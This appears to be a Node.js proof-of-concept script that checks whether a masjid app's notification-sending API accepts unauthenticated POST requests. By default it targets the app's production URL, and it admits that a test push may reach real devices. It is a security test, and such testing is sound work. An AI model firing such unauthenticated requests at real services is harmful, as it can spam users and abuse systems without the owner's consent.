// test-notification.js
// Run this script to test the unauthenticated API endpoint.
// Usage: node test-notification.js [target_url]
// Example: node test-notification.js http://localhost:3000
// Defaults to the production URL.

const target = process.argv[2] || 'https://mymasjidapp.vercel.app';
const apiEndpoint = `${target}/api/notifications/send`;

console.log(`\n🚨 Testing Notification Vulnerability against: ${apiEndpoint}\n`);

async function testVulnerability() {
  const payload = {
    title: "⚠️ UJIAN KESELAMATAN / TEST ⚠️",
    body: "This is a test notification. If you see this, the API endpoint is unprotected and anyone can send messages.",
    recipientType: "topic",
    topic: "test-security-topic-nobody-subscribed",
    url: "/"
  };

  try {
    console.log("Sending POST request to:", apiEndpoint);
    console.log("Payload:", JSON.stringify(payload, null, 2));
    console.log("\nWaiting for response from server...\n");

    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
        // Notice there is NO Authorization header or session token sent here!
      },
      body: JSON.stringify(payload)
    });

    const contentType = response.headers.get("content-type");
    let data;
    if (contentType && contentType.includes("application/json")) {
        data = await response.json();
    } else {
        data = await response.text();
    }

    console.log(`HTTP Status Code: ${response.status} ${response.statusText}`);
    
    if (response.ok) {
        console.log("\n❌ VULNERABILITY CONFIRMED ❌");
        console.log("The server accepted the unauthenticated request.");
        console.log("Response Data:", data);
        console.log("\n⚠️ Note: The message may have been pushed to registered devices if the target was production!");
    } else {
        console.log("\n✅ SERVER REJECTED IT");
        console.log("The endpoint is likely protected, or an error occurred.");
        console.log("Response details:", data);
    }
  } catch (error) {
    console.error("\n❌ Network Error. Make sure the provided URL is correct and the server is running (e.g., node test-notification.js http://localhost:3000).");
    console.error(error.message);
  }
}

testVulnerability();
